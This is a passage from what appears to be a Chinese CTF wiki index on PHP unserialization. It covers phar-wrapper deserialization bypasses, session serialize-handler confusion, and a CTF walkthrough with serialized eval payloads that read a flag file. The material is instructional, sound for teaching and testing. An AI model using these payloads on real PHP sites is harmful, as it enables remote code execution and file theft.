( \"test.txt\" , \"test\" ); //\u6dfb\u52a0\u8981\u538b\u7f29\u7684\u6587\u4ef6 //\u7b7e\u540d\u81ea\u52a8\u8ba1\u7b97 $phar -> stopBuffering (); ?> \u6f0f\u6d1e\u5229\u7528\u6761\u4ef6 \u00b6 phar\u6587\u4ef6\u8981\u80fd\u591f\u4e0a\u4f20\u5230\u670d\u52a1\u5668\u7aef\u3002 \u8981\u6709\u53ef\u7528\u7684\u9b54\u672f\u65b9\u6cd5\u4f5c\u4e3a\u201c\u8df3\u677f\u201d\u3002 \u6587\u4ef6\u64cd\u4f5c\u51fd\u6570\u7684\u53c2\u6570\u53ef\u63a7\uff0c\u4e14 : \u3001 / \u3001 phar \u7b49\u7279\u6b8a\u5b57\u7b26\u6ca1\u6709\u88ab\u8fc7\u6ee4\u3002 \u53d7\u5f71\u54cd\u7684\u51fd\u6570 \u00b6 \u77e5\u9053\u521b\u5b87\u6d4b\u8bd5\u540e\u53d7\u5f71\u54cd\u7684\u51fd\u6570\u5217\u8868\uff1a \u5b9e\u9645\u4e0a\u4e0d\u6b62\u8fd9\u4e9b\uff0c\u4e5f\u53ef\u4ee5\u53c2\u8003\u8fd9\u7bc7\u94fe\u63a5\uff0c\u91cc\u9762\u6709\u8be6\u7ec6\u8bf4\u660ehttps://blog.zsxsoft.com/post/38 \u5f53\u7136\u4e3a\u4e86\u9605\u8bfb\u65b9\u4fbf\uff0c\u8fd9\u91cc\u4fbf\u628a\u5b83\u6574\u7406\u8fc7\u6765 //exif exif_thumbnail exif_imagetype //gd imageloadfont imagecreatefrom***\u7cfb\u5217\u51fd\u6570 //hash hash_hmac_file hash_file hash_update_file md5_file sha1_file // file/url get_meta_tags get_headers //standard getimagesize getimagesizefromstring // zip $zip = new ZipArchive(); $res = $zip->open('c.zip'); $zip->extractTo('phar://test.phar/test'); // Bzip / Gzip \u5f53\u73af\u5883\u9650\u5236\u4e86phar\u4e0d\u80fd\u51fa\u73b0\u5728\u524d\u9762\u7684\u5b57\u7b26\u91cc\u3002\u53ef\u4ee5\u4f7f\u7528compress.bzip2://\u548ccompress.zlib://\u7ed5\u8fc7 $z = 'compress.bzip2://phar:///home/sx/test.phar/test.txt'; $z = 'compress.zlib://phar:///home/sx/test.phar/test.txt'; //\u914d\u5408\u5176\u4ed6\u534f\u8bae\uff1a(SUCTF) //https://www.xctf.org.cn/library/details/17e9b70557d94b168c3e5d1e7d4ce78f475de26d/ //\u5f53\u73af\u5883\u9650\u5236\u4e86phar\u4e0d\u80fd\u51fa\u73b0\u5728\u524d\u9762\u7684\u5b57\u7b26\u91cc\uff0c\u8fd8\u53ef\u4ee5\u914d\u5408\u5176\u4ed6\u534f\u8bae\u8fdb\u884c\u5229\u7528\u3002 //php://filter/read=convert.base64-encode/resource=phar://phar.phar //Postgres pgsqlCopyToFile\u548cpg_trace\u540c\u6837\u4e5f\u662f\u80fd\u4f7f\u7528\u7684\uff0c\u9700\u8981\u5f00\u542fphar\u7684\u5199\u529f\u80fd\u3002 <?php $pdo = new PDO ( sprintf ( \"pgsql:host=%s;dbname=%s;user=%s;password=%s\" , \"127.0.0.1\" , \"postgres\" , \"sx\" , \"123456\" )); @ $pdo -> pgsqlCopyFromFile ( 'aa' , 'phar://phar.phar/aa' ); ?> // Mysql //LOAD DATA LOCAL INFILE\u4e5f\u4f1a\u89e6\u53d1\u8fd9\u4e2aphp_stream_open_wrapper //\u914d\u7f6e\u4e00\u4e0bmysqld: //[mysqld] //local-infile=1 //secure_file_priv=\"\" <?php class A { public $s = '' ; public function __wakeup () { system ( $this -> s ); } } $m = mysqli_init (); mysqli_options ( $m , MYSQLI_OPT_LOCAL_INFILE , true ); $s = mysqli_real_connect ( $m , 'localhost' , 'root' , 'root' , 'testtable' , 3306 ); $p = mysqli_query ( $m , 'LOAD DATA LOCAL INFILE \\'phar://test.phar/test\\' INTO TABLE a LINES TERMINATED BY \\'\\r\\n\\' IGNORE 1 LINES;' ); ?> \u7ed5\u8fc7\u65b9\u5f0f \u00b6 \u5f53\u73af\u5883\u9650\u5236\u4e86phar\u4e0d\u80fd\u51fa\u73b0\u5728\u524d\u9762\u7684\u5b57\u7b26\u91cc\u3002\u53ef\u4ee5\u4f7f\u7528 compress.bzip2:// \u548c compress.zlib:// \u7b49\u7ed5\u8fc7 compress.bzip://phar:///test.phar/test.txt compress.bzip2://phar:///test.phar/test.txt compress.zlib://phar:///home/sx/test.phar/test.txt php://filter/resource=phar:///test.phar/test.txt \u5f53\u73af\u5883\u9650\u5236\u4e86phar\u4e0d\u80fd\u51fa\u73b0\u5728\u524d\u9762\u7684\u5b57\u7b26\u91cc\uff0c\u8fd8\u53ef\u4ee5\u914d\u5408\u5176\u4ed6\u534f\u8bae\u8fdb\u884c\u5229\u7528\u3002 php://filter/read=convert.base64-encode/resource=phar://phar.phar GIF\u683c\u5f0f\u9a8c\u8bc1\u53ef\u4ee5\u901a\u8fc7\u5728\u6587\u4ef6\u5934\u90e8\u6dfb\u52a0GIF89a\u7ed5\u8fc7 1\u3001$phar->setStub(\"GIF89a\".\"<?php __HALT_COMPILER(); ?>\"); //\u8bbe\u7f6estub 2\u3001\u751f\u6210\u4e00\u4e2aphar.phar\uff0c\u4fee\u6539\u540e\u7f00\u540d\u4e3aphar.gif php-session\u53cd\u5e8f\u5217\u5316 \u00b6 session\u7b80\u5355\u4ecb\u7ecd \u00b6 \u5728\u8ba1\u7b97\u673a\u4e2d\uff0c\u5c24\u5176\u662f\u5728\u7f51\u7edc\u5e94\u7528\u4e2d\uff0c\u79f0\u4e3a\u201c\u4f1a\u8bdd\u63a7\u5236\u201d\u3002Session \u5bf9\u8c61\u5b58\u50a8\u7279\u5b9a\u7528\u6237\u4f1a\u8bdd\u6240\u9700\u7684\u5c5e\u6027\u53ca\u914d\u7f6e\u4fe1\u606f\u3002\u8fd9\u6837\uff0c\u5f53\u7528\u6237\u5728\u5e94\u7528\u7a0b\u5e8f\u7684 Web \u9875\u4e4b\u95f4\u8df3\u8f6c\u65f6\uff0c\u5b58\u50a8\u5728 Session \u5bf9\u8c61\u4e2d\u7684\u53d8\u91cf\u5c06\u4e0d\u4f1a\u4e22\u5931\uff0c\u800c\u662f\u5728\u6574\u4e2a\u7528\u6237\u4f1a\u8bdd\u4e2d\u4e00\u76f4\u5b58\u5728\u4e0b\u53bb\u3002\u5f53\u7528\u6237\u8bf7\u6c42\u6765\u81ea\u5e94\u7528\u7a0b\u5e8f\u7684 Web \u9875\u65f6\uff0c\u5982\u679c\u8be5\u7528\u6237\u8fd8\u6ca1\u6709\u4f1a\u8bdd\uff0c\u5219 Web \u670d\u52a1\u5668\u5c06\u81ea\u52a8\u521b\u5efa\u4e00\u4e2a Session \u5bf9\u8c61\u3002\u5f53\u4f1a\u8bdd\u8fc7\u671f\u6216\u88ab\u653e\u5f03\u540e\uff0c\u670d\u52a1\u5668\u5c06\u7ec8\u6b62\u8be5\u4f1a\u8bdd\u3002 \u5f53\u7b2c\u4e00\u6b21\u8bbf\u95ee\u7f51\u7ad9\u65f6\uff0cSeesion_start()\u51fd\u6570\u5c31\u4f1a\u521b\u5efa\u4e00\u4e2a\u552f\u4e00\u7684Session ID\uff0c\u5e76\u81ea\u52a8\u901a\u8fc7HTTP\u7684\u54cd\u5e94\u5934\uff0c\u5c06\u8fd9\u4e2aSession ID\u4fdd\u5b58\u5230\u5ba2\u6237\u7aefCookie\u4e2d\u3002\u540c\u65f6\uff0c\u4e5f\u5728\u670d\u52a1\u5668\u7aef\u521b\u5efa\u4e00\u4e2a\u4ee5Session ID\u547d\u540d\u7684\u6587\u4ef6\uff0c\u7528\u4e8e\u4fdd\u5b58\u8fd9\u4e2a\u7528\u6237\u7684\u4f1a\u8bdd\u4fe1\u606f\u3002\u5f53\u540c\u4e00\u4e2a\u7528\u6237\u518d\u6b21\u8bbf\u95ee\u8fd9\u4e2a\u7f51\u7ad9\u65f6\uff0c\u4e5f\u4f1a\u81ea\u52a8\u901a\u8fc7HTTP\u7684\u8bf7\u6c42\u5934\u5c06Cookie\u4e2d\u4fdd\u5b58\u7684Seesion ID\u518d\u643a\u5e26\u8fc7\u6765\uff0c\u8fd9\u65f6Session_start()\u51fd\u6570\u5c31\u4e0d\u4f1a\u518d\u53bb\u5206\u914d\u4e00\u4e2a\u65b0\u7684Session ID\uff0c\u800c\u662f\u5728\u670d\u52a1\u5668\u7684\u786c\u76d8\u4e2d\u53bb\u5bfb\u627e\u548c\u8fd9\u4e2aSession ID\u540c\u540d\u7684Session\u6587\u4ef6\uff0c\u5c06\u8fd9\u4e4b\u524d\u4e3a\u8fd9\u4e2a\u7528\u6237\u4fdd\u5b58\u7684\u4f1a\u8bdd\u4fe1\u606f\u8bfb\u51fa\uff0c\u5728\u5f53\u524d\u811a\u672c\u4e2d\u5e94\u7528\uff0c\u8fbe\u5230\u8ddf\u8e2a\u8fd9\u4e2a\u7528\u6237\u7684\u76ee\u7684\u3002 session \u7684\u5b58\u50a8\u673a\u5236 \u00b6 php\u4e2d\u7684session\u4e2d\u7684\u5185\u5bb9\u5e76\u4e0d\u662f\u653e\u5728\u5185\u5b58\u4e2d\u7684\uff0c\u800c\u662f\u4ee5\u6587\u4ef6\u7684\u65b9\u5f0f\u6765\u5b58\u50a8\u7684\uff0c\u5b58\u50a8\u65b9\u5f0f\u5c31\u662f\u7531\u914d\u7f6e\u9879session.save_handler\u6765\u8fdb\u884c\u786e\u5b9a\u7684\uff0c\u9ed8\u8ba4\u662f\u4ee5\u6587\u4ef6\u7684\u65b9\u5f0f\u5b58\u50a8\u3002 \u5b58\u50a8\u7684\u6587\u4ef6\u662f\u4ee5sess_sessionid\u6765\u8fdb\u884c\u547d\u540d\u7684 php_serialize \u7ecf\u8fc7serialize()\u51fd\u6570\u5e8f\u5217\u5316\u6570\u7ec4 php \u952e\u540d+\u7ad6\u7ebf+\u7ecf\u8fc7serialize()\u51fd\u6570\u5904\u7406\u7684\u503c php_binary \u952e\u540d\u7684\u957f\u5ea6\u5bf9\u5e94\u7684ascii\u5b57\u7b26+\u952e\u540d+serialize()\u51fd\u6570\u5e8f\u5217\u5316\u7684\u503c php.ini\u4e2d\u4e00\u4e9bsession\u914d\u7f6e \u00b6 session.save_path=\"\" --\u8bbe\u7f6esession\u7684\u5b58\u50a8\u8def\u5f84 session.save_handler=\"\"--\u8bbe\u5b9a\u7528\u6237\u81ea\u5b9a\u4e49\u5b58\u50a8\u51fd\u6570\uff0c\u5982\u679c\u60f3\u4f7f\u7528PHP\u5185\u7f6e\u4f1a\u8bdd\u5b58\u50a8\u673a\u5236\u4e4b\u5916\u7684\u53ef\u4ee5\u4f7f\u7528\u672c\u51fd\u6570(\u6570\u636e\u5e93\u7b49\u65b9\u5f0f) session.auto_start boolen--\u6307\u5b9a\u4f1a\u8bdd\u6a21\u5757\u662f\u5426\u5728\u8bf7\u6c42\u5f00\u59cb\u65f6\u542f\u52a8\u4e00\u4e2a\u4f1a\u8bdd\u9ed8\u8ba4\u4e3a0\u4e0d\u542f\u52a8 session.serialize_handler string--\u5b9a\u4e49\u7528\u6765\u5e8f\u5217\u5316/\u53cd\u5e8f\u5217\u5316\u7684\u5904\u7406\u5668\u540d\u5b57\u3002\u9ed8\u8ba4\u4f7f\u7528php \u5229\u7528\u59ff\u52bf \u00b6 session.upload_progress\u8fdb\u884c\u6587\u4ef6\u5305\u542b\u548c\u53cd\u5e8f\u5217\u5316\u6e17\u900f \u00b6 \u8fd9\u7bc7\u6587\u7ae0\u8bf4\u7684\u5f88\u8be6\u7ec6\u4e86\uff0c\u6ca1\u5fc5\u8981\u73ed\u95e8\u5f04\u65a7 https://www.freebuf.com/vuls/202819.html \u4f7f\u7528\u4e0d\u540c\u7684\u5f15\u64ce\u6765\u5904\u7406session\u6587\u4ef6 \u00b6 $_SESSION\u53d8\u91cf\u76f4\u63a5\u53ef\u63a7 \u00b6 php\u5f15\u64ce\u7684\u5b58\u50a8\u683c\u5f0f\u662f \u952e\u540d|serialized_string \uff0c\u800cphp_serialize\u5f15\u64ce\u7684\u5b58\u50a8\u683c\u5f0f\u662f serialized_string \u3002\u5982\u679c\u7a0b\u5e8f\u4f7f\u7528\u4e24\u4e2a\u5f15\u64ce\u6765\u5206\u522b\u5904\u7406\u7684\u8bdd\u5c31\u4f1a\u51fa\u73b0\u95ee\u9898 \u6765\u770b\u770b\u8fd9\u4e24\u4e2aphp // 1.php <?php ini_set ( 'session.serialize_handler' , 'php_serialize' ); session_start (); $_SESSION [ 'y4' ] = $_GET [ 'a' ]; var_dump ( $_SESSION ); //2.php <? php ini_set ( 'session.serialize_handler' , 'php' ); session_start (); class test { public $name ; function __wakeup (){ echo $this -> name ; } } \u9996\u5148\u8bbf\u95ee1.php\uff0c\u4f20\u5165\u53c2\u6570 a=|O:4:\"test\":1:{s:4:\"name\";s:8:\"y4tacker\";} \u518d\u8bbf\u95ee2.php\uff0c\u6ce8\u610f\u4e0d\u8981\u5fd8\u8bb0 | \u7531\u4e8e 1.php \u662f\u4f7f\u7528 php_serialize \u5f15\u64ce\u5904\u7406\uff0c\u56e0\u6b64\u53ea\u4f1a\u628a '|' \u5f53\u505a\u4e00\u4e2a\u6b63\u5e38\u7684\u5b57\u7b26\u3002\u7136\u540e\u8bbf\u95ee 2.php \uff0c\u7531\u4e8e\u7528\u7684\u662f php \u5f15\u64ce\uff0c\u56e0\u6b64\u9047\u5230 '|' \u65f6\u4f1a\u5c06\u4e4b\u770b\u505a\u952e\u540d\u4e0e\u503c\u7684\u5206\u5272\u7b26\uff0c\u4ece\u800c\u9020\u6210\u4e86\u6b67\u4e49\uff0c\u5bfc\u81f4\u5176\u5728\u89e3\u6790session\u6587\u4ef6\u65f6\u76f4\u63a5\u5bf9 '|' \u540e\u7684\u503c\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u5904\u7406\u3002 \u8fd9\u91cc\u53ef\u80fd\u4f1a\u6709\u4e00\u4e2a\u5c0f\u7591\u95ee\uff0c\u4e3a\u4ec0\u4e48\u5728\u89e3\u6790session\u6587\u4ef6\u65f6\u76f4\u63a5\u5bf9 '|' \u540e\u7684\u503c\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u5904\u7406\uff0c\u8fd9\u4e5f\u662f\u5904\u7406\u5668\u7684\u529f\u80fd\uff1f\u8fd9\u4e2a\u5176\u5b9e\u662f\u56e0\u4e3a session_start() \u8fd9\u4e2a\u51fd\u6570\uff0c\u53ef\u4ee5\u770b\u4e0b\u5b98\u65b9\u8bf4\u660e\uff1a \u5f53\u4f1a\u8bdd\u81ea\u52a8\u5f00\u59cb\u6216\u8005\u901a\u8fc7 session_start() \u624b\u52a8\u5f00\u59cb\u7684\u65f6\u5019\uff0c PHP \u5185\u90e8\u4f1a\u8c03\u7528\u4f1a\u8bdd\u7ba1\u7406\u5668\u7684 open \u548c read \u56de\u8c03\u51fd\u6570\u3002 \u4f1a\u8bdd\u7ba1\u7406\u5668\u53ef\u80fd\u662f PHP \u9ed8\u8ba4\u7684\uff0c \u4e5f\u53ef\u80fd\u662f\u6269\u5c55\u63d0\u4f9b\u7684\uff08SQLite \u6216\u8005 Memcached \u6269\u5c55\uff09\uff0c \u4e5f\u53ef\u80fd\u662f\u901a\u8fc7 session_set_save_handler() \u8bbe\u5b9a\u7684\u7528\u6237\u81ea\u5b9a\u4e49\u4f1a\u8bdd\u7ba1\u7406\u5668\u3002 \u901a\u8fc7 read \u56de\u8c03\u51fd\u6570\u8fd4\u56de\u7684\u73b0\u6709\u4f1a\u8bdd\u6570\u636e \uff08\u4f7f\u7528\u7279\u6b8a\u7684\u5e8f\u5217\u5316\u683c\u5f0f\u5b58\u50a8\uff09\uff0c PHP \u4f1a\u81ea\u52a8\u53cd\u5e8f\u5217\u5316\u6570\u636e\u5e76\u4e14\u586b\u5145 $_SESSION \u8d85\u7ea7\u5168\u5c40\u53d8\u91cf \u56e0\u6b64\u6211\u4eec\u6210\u529f\u89e6\u53d1\u4e86 test \u7c7b\u4e2d\u7684 __wakeup() \u65b9\u6cd5,\u6240\u4ee5\u8fd9\u79cd\u653b\u51fb\u601d\u8def\u662f\u53ef\u884c\u7684\u3002\u4f46\u8fd9\u79cd\u65b9\u6cd5\u662f\u5728\u53ef\u4ee5\u5bf9 session \u7684\u8fdb\u884c\u8d4b\u503c\u7684\uff0c\u90a3\u5982\u679c\u4ee3\u7801\u4e2d\u4e0d\u5b58\u5728\u5bf9 $_SESSION \u53d8\u91cf\u8d4b\u503c\u7684\u60c5\u51b5\u4e0b\u53c8\u8be5\u5982\u4f55\u5229\u7528 $_SESSION\u53d8\u91cf\u76f4\u63a5\u4e0d\u53ef\u63a7 \u00b6 \u6211\u4eec\u6765\u770b\u9ad8\u6821\u6218\u75ab\u7684\u4e00\u9053CTF\u9898\u76ee <?php //A webshell is wait for you ini_set ( 'session.serialize_handler' , 'php' ); session_start (); class OowoO { public $mdzz ; function __construct () { $this -> mdzz = 'phpinfo();' ; } function __destruct () { eval ( $this -> mdzz ); } } if ( isset ( $_GET [ 'phpinfo' ])) { $m = new OowoO (); } else { highlight_string ( file_get_contents ( 'index.php' )); } ?> \u6211\u4eec\u6ce8\u610f\u5230\u8fd9\u6837\u4e00\u53e5\u8bdd ini_set('session.serialize_handler', 'php'); \uff0c\u56e0\u6b64\u4e0d\u96be\u731c\u6d4b\u672c\u8eab\u5728 php.ini \u5f53\u4e2d\u7684\u8bbe\u7f6e\u53ef\u80fd\u662f php_serialize \uff0c\u5728\u67e5\u770b\u4e86 phpinfo \u540e\u5f97\u8bc1\u731c\u6d4b\u6b63\u786e\uff0c\u4e5f\u77e5\u9053\u4e86\u8fd9\u9053\u9898\u7684\u8003\u70b9 \u90a3\u4e48\u6211\u4eec\u5c31\u8fdb\u5165phpinfo\u67e5\u770b\u4e00\u4e0b\uff0cenabled=on\u8868\u793aupload_progress\u529f\u80fd\u5f00\u59cb\uff0c\u4e5f\u610f\u5473\u7740\u5f53\u6d4f\u89c8\u5668\u5411\u670d\u52a1\u5668\u4e0a\u4f20\u4e00\u4e2a\u6587\u4ef6\u65f6\uff0cphp\u5c06\u4f1a\u628a\u6b64\u6b21\u6587\u4ef6\u4e0a\u4f20\u7684\u8be6\u7ec6\u4fe1\u606f(\u5982\u4e0a\u4f20\u65f6\u95f4\u3001\u4e0a\u4f20\u8fdb\u5ea6\u7b49)\u5b58\u50a8\u5728session\u5f53\u4e2d \uff1b\u53ea\u9700\u5f80\u8be5\u5730\u5740\u4efb\u610f POST \u4e00\u4e2a\u540d\u4e3a PHP_SESSION_UPLOAD_PROGRESS \u7684\u5b57\u6bb5\uff0c\u5c31\u53ef\u4ee5\u5c06filename\u7684\u503c\u8d4b\u503c\u5230session\u4e2d \u6784\u9020\u6587\u4ef6\u4e0a\u4f20\u7684\u8868\u5355 < form action = \"http://web.jarvisoj.com:32784/index.php\" method = \"POST\" enctype = \"multipart/form-data\" > < input type = \"hidden\" name = \"777\" /> < input type = \"file\" name = \"file\" /> < input type = \"submit\" /> </ form > \u63a5\u4e0b\u6765\u6784\u9020\u5e8f\u5217\u5316payload <?php ini_set ( 'session.serialize_handler' , 'php_serialize' ); session_start (); class OowoO { public $mdzz = 'print_r(scandir(dirname(__FILE__)));' ; } $obj = new OowoO (); echo serialize ( $obj ); ?> \u7531\u4e8e\u91c7\u7528Burp\u53d1\u5305\uff0c\u4e3a\u9632\u6b62\u53cc\u5f15\u53f7\u88ab\u8f6c\u4e49\uff0c\u5728\u53cc\u5f15\u53f7\u524d\u52a0\u4e0a \\ \uff0c\u9664\u6b64\u4e4b\u5916\u8fd8\u8981\u52a0\u4e0a | \u5728\u8fd9\u4e2a\u9875\u9762\u968f\u4fbf\u4e0a\u4f20\u4e00\u4e2a\u6587\u4ef6\uff0c\u7136\u540e\u6293\u5305\u4fee\u6539 filename \u7684\u503c \u53ef\u4ee5\u770b\u5230 Here_1s_7he_fl4g_buT_You_Cannot_see.php \u8fd9\u4e2a\u6587\u4ef6\uff0cflag\u80af\u5b9a\u5728\u91cc\u9762\uff0c\u4f46\u8fd8\u6709\u4e00\u4e2a\u95ee\u9898\u5c31\u662f\u4e0d\u77e5\u9053\u8fd9\u4e2a\u8def\u5f84\uff0c\u8def\u5f84\u7684\u95ee\u9898\u5c31\u9700\u8981\u56de\u5230phpinfo\u9875\u9762\u53bb\u67e5\u770b \u56e0\u6b64\u6211\u4eec\u53ea\u9700\u8981\u628apayload\uff0c\u5f53\u4e2d\u6539\u4e3a print_r(file_get_contents(\"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\")); \u5373\u53ef\u83b7\u53d6flag <?php ini_set ( 'session.serialize_handler' , 'php_serialize' ); session_start (); class OowoO { public $mdzz = 'print_r(file_get_contents(\"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\"));' ; } $obj = new OowoO (); echo serialize ( $obj ); ?> \u53c2\u8003\u6587\u7ae0 \u00b6 https://xz.aliyun.com/t/2715 https://xz.aliyun.com/t/2613 https://threezh1.com/2019/09/09/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/ https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf https://blog.csdn.net/qq_43431158/article/details/99544797 https://www.cnblogs.com/or4nge/p/13439974.html https://blog.zsxsoft.com/post/38 https://paper.seebug.org/680/ https://www.freebuf.com/articles/web/182231.html https://www.freebuf.com/vuls/202819.html","title":"PHP\u53cd\u5e8f\u5217\u5316"},{"location":"CTFWiki/Web/Unserialize/php\u53cd\u5e8f\u5217\u5316/#php","text":"","title":"PHP\u53cd\u5e8f\u5217\u5316"},{"location":"CTFWiki/Web/Unserialize/php\u53cd\u5e8f\u5217\u5316/#_1","text":"\u5e8f\u5217\u5316\u5176\u5b9e\u5c31\u662f\u5c06\u6570\u636e\u8f6c\u5316\u6210\u4e00\u79cd\u53ef\u9006\u7684\u6570\u636e\u7ed3\u6784\uff0c\u81ea\u7136\uff0c\u9006\u5411\u7684\u8fc7\u7a0b\u5c31\u53eb\u505a\u53cd\u5e8f\u5217\u5316\u3002 \u5728\u7f51\u4e0a\u627e\u5230\u4e00\u4e2a\u6bd4\u8f83\u5f62\u8c61\u7684\u4f8b\u5b50 \u6bd4\u5982\uff1a\u73b0\u5728\u6211\u4eec\u90fd\u4f1a\u5728\u6dd8\u5b9d\u4e0a\u4e70\u684c\u5b50\uff0c\u684c\u5b50\u8fd9\u79cd\u5f88\u4e0d\u89c4\u5219\u7684\u4e1c\u897f\uff0c\u8be5\u600e\u4e48\u4ece\u4e00\u4e2a\u57ce\u5e02\u8fd0\u8f93\u5230\u53e6\u4e00\u4e2a\u57ce\u5e02\uff0c\u8fd9\u65f6\u5019\u4e00\u822c\u90fd\u4f1a\u628a\u5b83\u62c6\u6389\u6210\u677f\u5b50\uff0c\u518d\u88c5\u5230\u7bb1\u5b50\u91cc\u9762\uff0c\u5c31\u53ef\u4ee5\u5feb\u9012\u5bc4\u51fa\u53bb\u4e86\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u5c31\u7c7b\u4f3c\u6211\u4eec\u7684\u5e8f\u5217\u5316\u7684\u8fc7\u7a0b\uff08\u628a\u6570\u636e\u8f6c\u5316\u4e3a\u53ef\u4ee5\u5b58\u50a8\u6216\u8005\u4f20\u8f93\u7684\u5f62\u5f0f\uff09\u3002\u5f53\u4e70\u5bb6\u6536\u5230\u8d27\u540e\uff0c\u5c31\u9700\u8981\u81ea\u5df1\u628a\u8fd9\u4e9b\u677f\u5b50\u7ec4\u88c5\u6210\u684c\u5b50\u7684\u6837\u5b50\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u5c31\u50cf\u53cd\u5e8f\u5217\u7684\u8fc7\u7a0b\uff08\u8f6c\u5316\u6210\u5f53\u521d\u7684\u6570\u636e\u5bf9\u8c61\uff09\u3002 php \u5c06\u6570\u636e\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u4f1a\u7528\u5230\u4e24\u4e2a\u51fd\u6570 serialize \u5c06\u5bf9\u8c61\u683c\u5f0f\u5316\u6210\u6709\u5e8f\u7684\u5b57\u7b26\u4e32 unserialize \u5c06\u5b57\u7b26\u4e32\u8fd8\u539f\u6210\u539f\u6765\u7684\u5bf9\u8c61 \u5e8f\u5217\u5316\u7684\u76ee\u7684\u662f\u65b9\u4fbf\u6570\u636e\u7684\u4f20\u8f93\u548c\u5b58\u50a8\uff0c\u5728PHP\u4e2d\uff0c\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u4e00\u822c\u7528\u505a\u7f13\u5b58\uff0c\u6bd4\u5982session\u7f13\u5b58\uff0ccookie\u7b49\u3002","title":"\u7b80\u4ecb"},{"location":"CTFWiki/Web/Unserialize/php\u53cd\u5e8f\u5217\u5316/#_2","text":"\u4e86\u89e3\u5373\u53ef \u4e8c\u8fdb\u5236\u683c\u5f0f \u5b57\u8282\u6570\u7ec4 json\u5b57\u7b26\u4e32 xml\u5b57\u7b26\u4e32","title":"\u5e38\u89c1\u7684\u5e8f\u5217\u5316\u683c\u5f0f"},{"location":"CTFWiki/Web/Unserialize/php\u53cd\u5e8f\u5217\u5316/#_3","text":"\u7b80\u5355\u7684\u4f8b\u5b50(\u4ee5\u6570\u7ec4\u4e3a\u4f8b\u5b50) <?php $user = array ( 'xiao' , 'shi' , 'zi' ); $user = serialize ( $user ); echo ( $user . PHP_EOL ); print_r ( unserialize ( $user )); \u4ed6\u4f1a\u8f93\u51fa a:3:{i:0;s:4:\"xiao\";i:1;s:3:\"shi\";i:2;s:2:\"zi\";} Array ( [0] => xiao [1] => shi [2] => zi ) \u6211\u4eec\u5bf9\u4e0a\u9762\u8fd9\u4e2a\u4f8b\u5b50\u505a\u4e2a\u7b80\u5355\u8bb2\u89e3\uff0c\u65b9\u4fbf\u5927\u5bb6\u5165\u95e8 a:3:{i:0;s:4:\"xiao\";i:1;s:3:\"shi\";i:2;s:2:\"zi\";} a:array\u4ee3\u8868\u662f\u6570\u7ec4\uff0c\u540e\u9762\u76843\u8bf4\u660e\u6709\u4e09\u4e2a\u5c5e\u6027 i:\u4ee3\u8868\u662f\u6574\u578b\u6570\u636eint\uff0c\u540e\u9762\u76840\u662f\u6570\u7ec4\u4e0b\u6807 s:\u4ee3\u8868\u662f\u5b57\u7b26\u4e32\uff0c\u540e\u9762\u76844\u662f\u56e0\u4e3axiao\u957f\u5ea6\u4e3a4 \u4f9d\u6b21\u7c7b\u63a8 \u5e8f\u5217\u5316\u540e\u7684\u5185\u5bb9\u53ea\u6709\u6210\u5458\u53d8\u91cf\uff0c\u6ca1\u6709\u6210\u5458\u51fd\u6570\uff0c\u6bd4\u5982\u4e0b\u9762\u7684\u4f8b\u5b50 <?php class test{ public $a; public $b; function __construct(){$this->a = \"xiaoshizi\";$this->b=\"laoshizi\";} function happy(){return $this->a;} } $a = new test(); echo serialize($a); ?> \u8f93\u51fa(O\u4ee3\u8868Object\u662f\u5bf9\u8c61\u7684\u610f\u601d\uff0c\u4e5f\u662f\u7c7b) O:4:\"test\":2:{s:1:\"a\";s:9:\"xiaoshizi\";s:1:\"b\";s:8:\"laoshizi\";} \u800c\u5982\u679c\u53d8\u91cf\u524d\u662fprotected\uff0c\u5219\u4f1a\u5728\u53d8\u91cf\u540d\u524d\u52a0\u4e0a \\x00*\\x00 ,private\u5219\u4f1a\u5728\u53d8\u91cf\u540d\u524d\u52a0\u4e0a \\x00\u7c7b\u540d\\x00 ,\u8f93\u51fa\u65f6\u4e00\u822c\u9700\u8981url\u7f16\u7801\uff0c\u82e5\u5728\u672c\u5730\u5b58\u50a8\u66f4\u63a8\u8350\u91c7\u7528base64\u7f16\u7801\u7684\u5f62\u5f0f\uff0c\u5982\u4e0b\uff1a <?php class test { protected $a ; private $b ; function __construct (){ $this -> a = \"xiaoshizi\" ; $this -> b = \"laoshizi\" ;} function happy (){ return $this -> a ;} } $a = new test (); echo serialize ( $a ); echo urlencode ( serialize ( $a )); ?> \u8f93\u51fa\u5219\u4f1a\u5bfc\u81f4\u4e0d\u53ef\u89c1\u5b57\u7b26 \\x00 \u7684\u4e22\u5931 O:4:\"test\":2:{s:4:\" * a\";s:9:\"xiaoshizi\";s:7:\" test b\";s:8:\"laoshizi\";}","title":"\u6848\u4f8b\u5f15\u5165"},{"location":"CTFWiki/Web/Unserialize/php\u53cd\u5e8f\u5217\u5316/#_4","text":"__wakeup() //\u6267\u884cunserialize()\u65f6\uff0c\u5148\u4f1a\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570 __sleep() //\u6267\u884cserialize()\u65f6\uff0c\u5148\u4f1a\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570 __destruct() //\u5bf9\u8c61\u88ab\u9500\u6bc1\u65f6\u89e6\u53d1 __call() //\u5728\u5bf9\u8c61\u4e0a\u4e0b\u6587\u4e2d\u8c03\u7528\u4e0d\u53ef\u8bbf\u95ee\u7684\u65b9\u6cd5\u65f6\u89e6\u53d1 __callStatic() //\u5728\u9759\u6001\u4e0a\u4e0b\u6587\u4e2d\u8c03\u7528\u4e0d\u53ef\u8bbf\u95ee\u7684\u65b9\u6cd5\u65f6\u89e6\u53d1 __get() //\u7528\u4e8e\u4ece\u4e0d\u53ef\u8bbf\u95ee\u7684\u5c5e\u6027\u8bfb\u53d6\u6570\u636e\u6216\u8005\u4e0d\u5b58\u5728\u8fd9\u4e2a\u952e\u90fd\u4f1a\u8c03\u7528\u6b64\u65b9\u6cd5 __set() 